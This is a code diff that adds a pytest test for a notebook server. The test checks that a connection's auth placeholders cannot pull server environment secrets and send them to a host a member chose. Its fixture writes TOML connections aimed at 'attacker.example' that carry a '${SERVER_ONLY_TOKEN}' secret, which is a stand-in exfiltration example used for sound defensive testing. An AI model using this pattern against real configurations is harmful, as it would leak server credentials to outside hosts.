@@ -2043,6 +2043,56 @@ def test_service_mode_schema_route_refuses_a_server_file(client, tmp_path, monke
     assert "artifact_publications" not in resp.text
 
 
+@pytest.mark.parametrize("mode", ["personal", "service"])
+def test_connection_auth_vars_read_the_notebook_env_in_service_mode(
+    client, tmp_path, monkeypatch, mode
+):
+    """``${VAR}`` in a connection's auth must not send the server's environment to a
+    host a member chose, nor say whether the server has the variable."""
+    from strata.config import StrataConfig
+    from strata.notebook.session import NotebookSession
+    from strata.notebook.sql.drivers.postgresql import PostgresAdapter
+
+    config = StrataConfig(cache_dir=tmp_path / "cache", deployment_mode=mode)
+    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
+    monkeypatch.setenv("SERVER_ONLY_TOKEN", "server-secret")
+    dialed: list[str] = []
+
+    def record(self, uri):
+        dialed.append(uri)
+        raise RuntimeError("not dialing")
+
+    monkeypatch.setattr(PostgresAdapter, "_invoke_connect", record)
+    notebook_dir = create_notebook(tmp_path / "notebooks", "Conn Env")
+    toml = notebook_dir / "notebook.toml"
+    toml.write_text(
+        toml.read_text()
+        + '\n[env]\nNB_USER = "nb-user"\n'
+        + '\n[connections.server]\ndriver = "postgresql"\nhost = "attacker.example"\n'
+        + '[connections.server.auth]\nuser = "${SERVER_ONLY_TOKEN}"\n'
+        + '\n[connections.missing]\ndriver = "postgresql"\nhost = "attacker.example"\n'
+        + '[connections.missing.auth]\nuser = "${NOT_SET_ANYWHERE}"\n'
+        + '\n[connections.notebook]\ndriver = "postgresql"\nhost = "attacker.example"\n'
+        + '[connections.notebook.auth]\nuser = "${NB_USER}"\n'
+    )
+    nb_id = open_session_id(client, notebook_dir)
+
+    server = client.get(f"/v1/notebooks/{nb_id}/connections/server/schema")
+    missing = client.get(f"/v1/notebooks/{nb_id}/connections/missing/schema")
+    notebook = client.get(f"/v1/notebooks/{nb_id}/connections/notebook/schema")
+
+    assert notebook.status_code == 502
+    if mode == "personal":
+        assert dialed == ["postgresql://server-secret@attacker.example:5432/postgres"]
+        assert missing.status_code == 502
+        return
+    assert dialed == ["postgresql://nb-user@attacker.example:5432/postgres"]
+    assert server.status_code == missing.status_code == 400
+    assert server.json()["detail"].replace("SERVER_ONLY_TOKEN", "X") == missing.json()[
+        "detail"
+    ].replace("NOT_SET_ANYWHERE", "X").replace("'missing'", "'server'")
+
+
 # Export
 
 
